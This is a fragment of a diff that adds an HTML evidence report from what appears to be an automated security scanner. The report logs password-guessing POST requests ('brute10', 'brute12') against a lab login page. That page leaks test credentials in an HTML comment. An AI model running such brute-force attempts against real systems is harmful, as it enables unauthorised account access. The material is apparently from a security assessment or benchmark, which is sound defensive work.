+                        &lt;div class=&quot;alert alert-danger mt-3&quot; role=&quot;alert&quot;&gt;
+                            Invalid username or password
+                        &lt;/div&gt;
+                        
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap Bundle with Popper --&gt;
+    &lt;script src=&quot;/static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr31lnv7-1f</code> — <code>artifacts/s-0001/ev-mr31lnv7-1f/</code></div><div class="lbl">REQUEST</div><pre>POST /login HTTP/1.1
+Host: target.local:32836
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+content-type: application/x-www-form-urlencoded
+authorization: &lt;redacted&gt;
+
+username=test&amp;password=brute12</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 1900
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 05:07:01 GMT
+expires: 0
+keep-alive: timeout=5, max=89
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+vary: Accept-Encoding
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Login&lt;/title&gt;
+    &lt;link href=&quot;/static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;!-- TODO: Delete the testing account (test:test). --&gt; 
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row justify-content-center mt-5&quot;&gt;
+            &lt;div class=&quot;col-md-6&quot;&gt;
+                &lt;div class=&quot;card&quot;&gt;
+                    &lt;div class=&quot;card-body&quot;&gt;
+                        &lt;h2 class=&quot;card-title text-center&quot;&gt;Login&lt;/h2&gt;
+                        &lt;form id=&quot;loginForm&quot; action=&quot;/login&quot; method=&quot;post&quot;&gt;
+                            &lt;div class=&quot;mb-3&quot;&gt;
+                                &lt;label for=&quot;username&quot; class=&quot;form-label&quot;&gt;Username:&lt;/label&gt;
+                                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;
+                            &lt;/div&gt;
+                            &lt;div class=&quot;mb-3&quot;&gt;
+                                &lt;label for=&quot;password&quot; class=&quot;form-label&quot;&gt;Password:&lt;/label&gt;
+                                &lt;input type=&quot;password&quot; class=&quot;form-control&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;
+                            &lt;/div&gt;
+                            &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Login&lt;/button&gt;
+                        &lt;/form&gt;
+                        
+                        &lt;!-- Display error message if login fails --&gt;
+                        &lt;div class=&quot;alert alert-danger mt-3&quot; role=&quot;alert&quot;&gt;
+                            Invalid username or password
+                        &lt;/div&gt;
+                        
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap Bundle with Popper --&gt;
+    &lt;script src=&quot;/static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr31llon-1d</code> — <code>artifacts/s-0001/ev-mr31llon-1d/</code></div><div class="lbl">REQUEST</div><pre>POST /login HTTP/1.1
+Host: target.local:32836
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+content-type: application/x-www-form-urlencoded
+authorization: &lt;redacted&gt;
+
+username=test&amp;password=brute10</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 1900
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 05:06:58 GMT
+expires: 0
+keep-alive: timeout=5, max=91
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+vary: Accept-Encoding
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Login&lt;/title&gt;
+    &lt;link href=&quot;/static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;!-- TODO: Delete the testing account (test:test). --&gt; 
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row justify-content-center mt-5&quot;&gt;
+            &lt;div class=&quot;col-md-6&quot;&gt;
+                &lt;div class=&quot;card&quot;&gt;
+                    &lt;div class=&quot;card-body&quot;&gt;
+                        &lt;h2 class=&quot;card-title text-center&quot;&gt;Login&lt;/h2&gt;
+                        &lt;form id=&quot;loginForm&quot; action=&quot;/login&quot; method=&quot;post&quot;&gt;
+                            &lt;div class=&quot;mb-3&quot;&gt;
+                                &lt;label for=&quot;username&quot; class=&quot;form-label&quot;&gt;Username:&lt;/label&gt;
+                                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;
+                            &lt;/div&gt;
+                            &lt;div class=&quot;mb-3&quot;&gt;
+                                &lt;label for=&quot;password&quot; class=&quot;form-label&quot;&gt;Password:&lt;/label&gt;
+                                &lt;input type=&quot;password&quot; class=&quot;form-control&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;
+                            &lt;/div&gt;
+                            &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Login&lt;/button&gt;
+                        &lt;/form&gt;
+                        
+                        &lt;!-- Display error message if login fails --&gt;
+                        &lt;div class=&quot;alert alert-danger mt-3&quot; role=&quot;alert&quot;&gt;
+                            Invalid username or password
+                        &lt;/div&gt;
+                        
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap Bundle with Popper --&gt;
+    &lt;script src=&quot;/static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+</body></html>
